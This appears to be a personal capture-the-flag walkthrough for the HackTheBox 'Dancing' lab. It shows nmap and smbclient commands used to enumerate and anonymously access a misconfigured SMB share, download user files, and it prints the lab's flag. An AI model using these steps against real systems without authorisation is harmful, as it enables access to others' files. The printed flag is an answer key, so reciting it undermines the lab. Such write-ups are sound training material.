---
title: "HackTheBox Starting Point: Dancing Walkthrough"
date: 2025-01-09
description: 'This is my personal notes for HTB Dancing Machine'
image: '/public/static/htb-cover.jpg'
tags: ["SMB", "Misconfiguration", "Anonymous Access"]
authors: ['chjwoo']
---


First, spawn the machine. In this case, my IP was `10.129.174.118`.

## Reconnaissance

As always, we start by enumerating the target machine's open ports using Nmap:

```bash
└─$ sudo nmap -sC -sV 10.129.174.118
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 13:28 WIB
Nmap scan report for 10.129.174.118
Host is up (0.99s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-01-30T10:35:55
|_  start_date: N/A
|_clock-skew: 3h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 476.40 seconds
```

As seen in the scan result, port 445 is open, which means an SMB service is running. We can try using `smbclient` to list available shared folders with the following command:

```bash
└─$ smbclient -L 10.129.174.118
Password for [WORKGROUP\w1thre]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.174.118 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The `-L` flag specifies the targeted host for the connection request. Running the command above reveals four available shares.

## Foothold

We will attempt to connect to the `WorkShares` share folder using the following command:

```bash
└─$ smbclient \\\\10.129.174.118\\WorkShares
Password for [WORKGROUP\w1thre]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 15:22:01 2021
  ..                                  D        0  Mon Mar 29 15:22:01 2021
  Amy.J                               D        0  Mon Mar 29 16:08:24 2021
  James.P                             D        0  Thu Jun  3 15:38:03 2021

                5114111 blocks of size 4096. 1750223 blocks available
smb: \>
```

We successfully established a connection. The `WorkShares` SMB share was misconfigured, allowing us to log in without credentials. Some basic Linux commands can be used to navigate the share:

```bash
ls   : List the contents of directories within the share.
cd   : Change directories within the share.
get  : Download files from the share.
exit : Exit the SMB shell.
```

By exploring the `Amy.J` folder, we find a file named `worknotes.txt`, which we can download using the `get` command:

```bash
└─$ smbclient \\\\10.129.174.118\\WorkShares
Password for [WORKGROUP\w1thre]:
Try "help" to get a list of possible commands.
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 16:08:24 2021
  ..                                  D        0  Mon Mar 29 16:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 18:00:37 2021

                5114111 blocks of size 4096. 1750488 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Amy.J\>
```

Next, let's explore the `James.P` folder:

```bash
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 15:38:03 2021
  ..                                  D        0  Thu Jun  3 15:38:03 2021
  flag.txt                            A       32  Mon Mar 29 16:26:57 2021

                5114111 blocks of size 4096. 1750488 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \James.P\>
```

We have found `flag.txt`. After retrieving the files, we can use the `exit` command to quit the SMB shell and check the downloaded files:

```bash
┌──(w1thre㉿hackbox)-[~/cybersec/hackthebox/starting_point/dancing]
└─$ cat worknotes.txt
- Start Apache server on the Linux machine.
- Secure the FTP server.
- Set up WinRM on dancing.

┌──(w1thre㉿hackbox)-[~/cybersec/hackthebox/starting_point/dancing]
└─$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

## Flag

The `flag.txt` file contains the flag:

```bash
5f61c10dffbc77a704d76016a22f1664
```